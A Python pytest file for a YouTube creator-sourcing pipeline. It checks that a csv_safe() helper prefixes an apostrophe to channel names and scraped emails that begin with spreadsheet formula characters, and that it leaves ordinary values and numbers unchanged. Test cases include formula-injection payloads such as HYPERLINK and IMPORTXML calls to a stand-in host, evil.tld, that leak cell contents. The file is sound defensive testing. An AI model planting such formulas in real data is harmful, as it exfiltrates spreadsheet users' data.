"""
CSV / formula injection into the reviewer's spreadsheet.

Airtable is not a formula-eval context, so nothing in these records
executes when they're pushed — which is exactly why `main.csv_safe()` looks
like a pointless prefix and is at risk of being "cleaned up". The eval
context is one step further downstream: a reviewer exports the Airtable
view to CSV and opens it in Excel or Google Sheets, and a cell whose first
character is =, +, -, @ or a leading tab/CR is parsed there as a FORMULA.

Two of the fields written are attacker-influenced — "Channel Name" is
whatever the channel owner typed, and "Email" can come out of
browser_email.py scraping arbitrary third-party sites — so a channel called
`=HYPERLINK("http://evil.tld?d="&A1,"click")` becomes a live payload on the
reviewer's machine.

The other half of this file is the mirror concern: the fix must not mangle
honest data. Every ordinary value below has to come back byte-identical,
and non-strings have to keep their type, because several record fields are
genuinely numeric and Airtable's Number fields reject strings.

No network: the record test monkeypatches every YouTube/Airtable call.
"""
import pytest
from search_zones import ZONE_CORE


# --- the dangerous prefixes ----------------------------------------------


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_every_formula_prefix_is_neutralised(prefix):
    """
    The leading apostrophe is what spreadsheets themselves use to mean
    "this cell is literal text" — Excel and Sheets both consume it on
    import and show the original string.
    """
    from main import csv_safe

    assert csv_safe(prefix + "SUM(A1:A9)") == "'" + prefix + "SUM(A1:A9)"


def test_the_prefix_list_is_the_documented_one():
    """
    Dropping an entry here (the whitespace ones look most droppable) would
    silently reopen the hole for that character. A leading tab or CR is
    stripped by some CSV importers *before* the formula check runs, which
    puts the "=" back at the front.
    """
    from main import SPREADSHEET_FORMULA_PREFIXES

    assert set(SPREADSHEET_FORMULA_PREFIXES) == {"=", "+", "-", "@", "\t", "\r"}


def test_a_realistic_hyperlink_payload_is_neutralised():
    """
    The actual attack: HYPERLINK exfiltrates neighbouring cells to a
    third-party host the moment the reviewer clicks what looks like a link.
    """
    from main import csv_safe

    payload = '=HYPERLINK("http://evil.tld","x")'
    assert csv_safe(payload) == "'" + payload


def test_a_cell_reference_exfiltration_payload_is_neutralised():
    from main import csv_safe

    payload = '=HYPERLINK("http://evil.tld?d="&A1,"click")'
    assert csv_safe(payload).startswith("'=")


def test_neutralisation_preserves_the_original_text_after_the_apostrophe():
    """
    The value is prefixed, never rewritten or escaped — a reviewer must
    still be able to read the real channel name out of the cell.
    """
    from main import csv_safe

    assert csv_safe("=cmd()")[1:] == "=cmd()"


def test_only_one_apostrophe_is_added():
    """A single quote is the whole fix; doubling it would show up in the cell."""
    from main import csv_safe

    assert csv_safe("=1+1") == "'=1+1"
    assert not csv_safe("=1+1").startswith("''")


# --- ordinary values must survive untouched -------------------------------


@pytest.mark.parametrize(
    "value",
    [
        # An apostrophe mid-string, the single most likely false positive in
        # a list of channel names.
        "Bob's Home Theater",
        # A real channel from the live Home Theater table.
        "AV NIRVANA",
        # A real address recovered by the Facebook /about probe. Contains @
        # but does not START with it — the check is on the first character
        # only, and a mangled email is a broken deliverable for every
        # honest candidate.
        "admin@avnirvana.com",
        # Hyphens and pluses inside an address, not leading it.
        "a-b@c.com",
        "first+tag@example.com",
        # Our own Source string, which starts with a letter.
        "YouTube Search (man cave tour)",
        # A leading space is not in the prefix list and must not be touched.
        " leading space",
        "",
    ],
)
def test_ordinary_values_are_byte_identical(value):
    from main import csv_safe

    assert csv_safe(value) == value


def test_a_dangerous_character_anywhere_but_the_front_is_ignored():
    from main import csv_safe

    assert csv_safe("2+2 review") == "2+2 review"
    assert csv_safe("Reviews = honest") == "Reviews = honest"


# --- non-strings keep their type ------------------------------------------


@pytest.mark.parametrize("value", [None, 0, 1234, 12.5, True])
def test_non_strings_pass_through_with_their_type_intact(value):
    """
    Subscriber Count, Avg Views, Engagement Rate, Fake Follower Risk Score
    and Overall Score are Airtable NUMBER fields, which reject strings via
    the API. Stringifying a value here would fail the push for every
    record, so csv_safe has to be a no-op on anything that isn't a string.
    """
    from main import csv_safe

    result = csv_safe(value)
    assert result == value
    assert isinstance(result, type(value))


def test_none_is_not_turned_into_a_string():
    from main import csv_safe

    assert csv_safe(None) is None


def test_a_negative_number_is_not_quoted():
    """
    -5 starts with "-" only once someone has stringified it. As a number it
    must stay a number; this is the case that would silently break a Number
    field if the isinstance check were dropped.
    """
    from main import csv_safe

    assert csv_safe(-5) == -5
    assert isinstance(csv_safe(-5), int)


# --- the record that actually reaches Airtable ---------------------------
#
# Same stubbing approach as tests/test_pipeline_regressions.py: the point is
# that csv_safe is wired into the right FIELDS, which unit tests on the
# helper alone can't show.


class _NullBlocklist:
    """Never matches — these tests aren't about the blocklist."""

    def match(self, handle="", email="", name=""):
        return ""


def _stub_stats(**overrides):
    stats = {
        "channel_id": "UC1",
        "channel_title": "Chan",
        "handle": "chan",
        "published_at": "",
        "subscriber_count": 10_000,
        "uploads_playlist_id": "PL1",
        "business_email": "",
        # Both are hard gates — a stub missing them gets discarded before
        # the record is ever built.
        "video_count": 100,
        "country": "US",
    }
    stats.update(overrides)
    return stats


def _stub_performance(**overrides):
    performance = {
        "avg_views": 50_000,
        "avg_engagement_rate": 1.0,
        "upload_dates": [],
        # "en" and a full long-form catalogue: both are hard gates now, so a
        # stub without them is discarded before any record is built.
        "content_language": "en",
        "repeated_email": "",
        "longform_count": 50,
        "duration_sample_size": 50,
        "next_page_token": "",
    }
    performance.update(overrides)
    return performance


def _build_record(monkeypatch, *, channel_title="Chan", email="", content_language="en"):
    """process_candidate() with every network call stubbed out."""
    import main

    monkeypatch.setattr(main, "get_channel_stats", lambda cid: _stub_stats(channel_title=channel_title))
    monkeypatch.setattr(
        main, "get_recent_video_performance",
        lambda cid, pl: _stub_performance(content_language=content_language),
    )
    monkeypatch.setattr(main, "channel_age_months", lambda published_at: 100)
    # process_candidate calls resolve_email_with_source (it needs the
    # link-list-presence flag); None here keeps the no-social drop dormant.
    monkeypatch.setattr(
        main, "resolve_email_with_source", lambda *a, **k: (email, "test-source", None)
    )
    monkeypatch.setattr(main.time, "sleep", lambda s: None)

    candidate = {"channel_id": "UC1", "channel_title": channel_title, "matched_keywords": []}
    niche_config = {"min_avg_views": 10_000, "min_channel_age_months": None, "allowed_country_codes": ZONE_CORE}
    record, _qualification = main.process_candidate(
        candidate, {}, _NullBlocklist(), niche_config, None,
    )
    assert record is not None, "the stub channel must clear every gate for this test to mean anything"
    return record


def test_a_hostile_channel_name_reaches_airtable_neutralised(monkeypatch):
    record = _build_record(monkeypatch, channel_title="=cmd()")

    assert record["Channel Name"] == "'=cmd()"


def test_the_channel_id_is_not_neutralised(monkeypatch):
    """
    The exclusion that matters most. Channel ID is the dedupe key
    airtable_client.channel_exists() looks up by, so a leading apostrophe
    would make every existing row invisible to that lookup and the pipeline
    would POST duplicates instead of PATCHing.
    """
    record = _build_record(monkeypatch, channel_title="=cmd()")

    assert record["Channel ID"] == "UC1"
    assert record["Channel URL"] == "https://www.youtube.com/channel/UC1"


def test_the_numeric_fields_are_not_neutralised(monkeypatch):
    """
    These are Airtable Number fields. A string here fails the whole record.
    """
    record = _build_record(monkeypatch, channel_title="=cmd()")

    for field in (
        "Subscriber Count",
        "Avg Views (last 10 videos)",
        "Engagement Rate",
        "Fake Follower Risk Score",
        "Overall Score",
    ):
        assert isinstance(record[field], (int, float)), field
        assert not isinstance(record[field], str), field


def test_the_single_selects_are_not_neutralised(monkeypatch):
    """
    push_record sends typecast=True, which silently CREATES a missing
    Single Select option instead of erroring — so a mangled "'Qualified"
    would quietly mint a new option and drop the row out of the reviewer's
    saved views.
    """
    from config import DEFAULT_STATUS
    from scoring import QUALIFIED

    record = _build_record(monkeypatch, channel_title="=cmd()")

    assert record["Qualification"] == QUALIFIED
    assert record["Status"] == DEFAULT_STATUS


def test_a_hostile_scraped_email_reaches_airtable_neutralised(monkeypatch):
    """
    Chain step 4 reads arbitrary third-party websites, so this field is as
    untrusted as the channel name.
    """
    record = _build_record(monkeypatch, email='=IMPORTXML("http://evil.tld","//x")')

    assert record["Email"].startswith("'=")


def test_an_ordinary_channel_name_and_email_are_written_unchanged(monkeypatch):
    """The no-false-positives case, end to end."""
    record = _build_record(
        monkeypatch, channel_title="Bob's Home Theater", email="admin@avnirvana.com",
    )

    assert record["Channel Name"] == "Bob's Home Theater"
    assert record["Email"] == "admin@avnirvana.com"


def test_a_hostile_content_language_is_dropped_outright(monkeypatch):
    """
    Content Language is no longer attacker-influenced: the English gate
    (main.is_english) requires the tag to START with "en", and no value
    beginning with =, +, -, @ or whitespace can do that. So a formula payload
    in this field can't reach Airtable at all — a stronger guarantee than the
    csv_safe neutralisation this test used to assert.

    csv_safe() stays applied to the field anyway; see the next test.

    Calls process_candidate directly rather than via _build_record, which
    asserts a record WAS built.
    """
    import main

    monkeypatch.setattr(main, "get_channel_stats", lambda cid: _stub_stats())
    monkeypatch.setattr(
        main, "get_recent_video_performance",
        lambda cid, pl: _stub_performance(content_language="=cmd()"),
    )
    monkeypatch.setattr(main, "channel_age_months", lambda published_at: 100)
    monkeypatch.setattr(main.time, "sleep", lambda s: None)

    record, reason = main.process_candidate(
        {"channel_id": "UC1", "channel_title": "Chan", "matched_keywords": []},
        {}, _NullBlocklist(),
        {"min_avg_views": 10_000, "min_channel_age_months": None, "allowed_country_codes": ZONE_CORE}, None,
    )

    assert record is None
    assert reason == "not_english"


def test_content_language_still_goes_through_csv_safe(monkeypatch):
    """
    Belt and braces. The English gate is what actually stops a payload here,
    but the wrapping must stay wired: if that gate is ever relaxed (a second
    allowed language, say), this field goes straight back to carrying
    creator-set text into a reviewer's spreadsheet.
    """
    import main

    record = _build_record(monkeypatch, content_language="en-GB")

    assert record["Content Language"] == "en-GB"
    assert record["Content Language"] == main.csv_safe(record["Content Language"])


def test_the_source_field_is_neutralised(monkeypatch):
    """Lower risk — Source is built from our own NICHES keywords — but it is
    still a free-text field, so it isn't left uncovered."""
    import main

    record = _build_record(monkeypatch)

    # Source starts with SOURCE_LABEL, which is ours and safe — assert it is
    # passed through csv_safe by checking the call is wired, not by faking a
    # hostile keyword list.
    assert record["Source"] == main.csv_safe(record["Source"])


def test_the_upload_frequency_string_always_starts_with_a_digit(monkeypatch):
    """
    Why "Upload Frequency" is deliberately left unwrapped: it is formatted
    here as "<n> videos/month", so csv_safe would be a guaranteed no-op.
    """
    record = _build_record(monkeypatch)

    assert record["Upload Frequency"][0].isdigit()


# --- The backfill path needs the same guard ------------------------------
#
# backfill_missing_emails.py re-runs the email chain over email-less rows and
# pushes the result directly, bypassing process_candidate() entirely. Step 4
# of that chain is browser_email.py scraping arbitrary third-party sites, so
# it is exactly as untrusted as the normal path — and it was writing raw.


def test_backfill_neutralises_a_formula_email(monkeypatch):
    """A scraped address starting with '=' must not reach Airtable raw."""
    import backfill_missing_emails as backfill

    pushed = []
    monkeypatch.setattr(
        backfill, "get_records_missing_email", lambda table_name: ["UC1"]
    )
    monkeypatch.setattr(backfill, "get_channel_stats", lambda cid: {
        "channel_id": cid, "channel_title": "Test", "uploads_playlist_id": "PL1",
        "description": "", "business_email": "", "handle": "test",
    })
    monkeypatch.setattr(backfill, "get_recent_video_performance", lambda cid, pl: {
        "video_descriptions": [], "repeated_email": "", "next_page_token": "",
    })
    monkeypatch.setattr(
        backfill, "resolve_email_with_source",
        lambda *a, **k: ('=HYPERLINK("http://evil.tld","x")', "browser", None),
    )
    monkeypatch.setattr(backfill, "push_record", lambda table, fields: pushed.append(fields) or True)
    # The optional "Email Source"/"Email Type" columns are PROBED before being
    # sent (push_record rejects the whole record for one unknown field), and the
    # probe is a real Airtable read that conftest correctly refuses. Answered
    # "no" here so these tests stay about csv_safe on the Email value.
    monkeypatch.setattr(backfill, "table_has_field", lambda table, field: False)
    monkeypatch.setattr(backfill.time, "sleep", lambda *a, **k: None)

    backfill.backfill_table("Test Niche", "tblFake", None, scraper=None)

    assert len(pushed) == 1
    assert pushed[0]["Email"].startswith("'=")
    # The dedupe key must NOT be touched — a prefixed Channel ID would make
    # channel_exists() miss and re-POST a duplicate row.
    assert pushed[0]["Channel ID"] == "UC1"


def test_backfill_leaves_an_ordinary_email_byte_identical(monkeypatch):
    import backfill_missing_emails as backfill

    pushed = []
    monkeypatch.setattr(backfill, "get_records_missing_email", lambda table_name: ["UC1"])
    monkeypatch.setattr(backfill, "get_channel_stats", lambda cid: {
        "channel_id": cid, "channel_title": "Test", "uploads_playlist_id": "PL1",
        "description": "", "business_email": "", "handle": "test",
    })
    monkeypatch.setattr(backfill, "get_recent_video_performance", lambda cid, pl: {
        "video_descriptions": [], "repeated_email": "", "next_page_token": "",
    })
    monkeypatch.setattr(
        backfill, "resolve_email_with_source",
        lambda *a, **k: ("admin@avnirvana.com", "about", None),
    )
    monkeypatch.setattr(backfill, "push_record", lambda table, fields: pushed.append(fields) or True)
    # The optional "Email Source"/"Email Type" columns are PROBED before being
    # sent (push_record rejects the whole record for one unknown field), and the
    # probe is a real Airtable read that conftest correctly refuses. Answered
    # "no" here so these tests stay about csv_safe on the Email value.
    monkeypatch.setattr(backfill, "table_has_field", lambda table, field: False)
    monkeypatch.setattr(backfill.time, "sleep", lambda *a, **k: None)

    backfill.backfill_table("Test Niche", "tblFake", None, scraper=None)

    assert pushed[0]["Email"] == "admin@avnirvana.com"
